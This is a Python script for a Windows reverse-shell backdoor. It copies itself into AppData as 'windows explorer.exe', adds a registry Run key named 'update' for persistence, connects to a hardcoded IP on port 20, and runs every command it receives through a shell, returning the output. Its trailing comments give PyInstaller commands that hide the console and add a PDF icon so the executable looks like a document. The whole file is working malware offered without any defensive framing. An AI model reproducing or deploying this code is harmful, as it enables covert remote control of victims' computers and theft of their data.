import socket
import subprocess
import os
import base64
import sys
import shutil

def system_command(command):
    return subprocess.check_output(command, shell=True)

def maintain_execution():
    location= os.environ["appdata"] + "\\windows explorer.exe" # it will store the reverse_backdoor file in appdata folder
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call( 'reg add hkcu\software\Microsoft\windows\currentversion\Run /v update /t REG_SZ /d "'+ location +'"', shell=True)

#file_name= sys._MEIPASS + "\ninja.jpg"
#subprocess.Popen(file_name, shell=True)

try:
    maintain_execution()
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect(('192.168.43.50',20))
except Exception:
    sys.exit()
#connection.send('[+] connection established') # it will send the msg to machine

while True:
    try:
        command= connection.recv(1024) # it will receive the data from the machine
        if command=='cd':
            os.chdir(command)
            print("[+] changing directory"+command)
        elif command=='exit':
            connection.close()
            sys.exit()
        command_result= system_command(command.decode("utf-8"))
        connection.send((command_result))
    except:
        print("[+] error in execution!!!")

#connection.close()
# to add a file in a .exe file the command is "pyinstaller --add-data "C:\\Users\\Rj\\Downloads\\SSC.txt;."  reverse_backdoor.py --onefile"
# to add icon file in .exe file the command is "pyinstaller --add-data C:\\Users\\Rj\\Downloads\\SSC.txt;.  --onefile --noconsole  --icon "C:\\Users\\Rj\\Downloads\\pdf.ico reverse_backdoor.py"  " 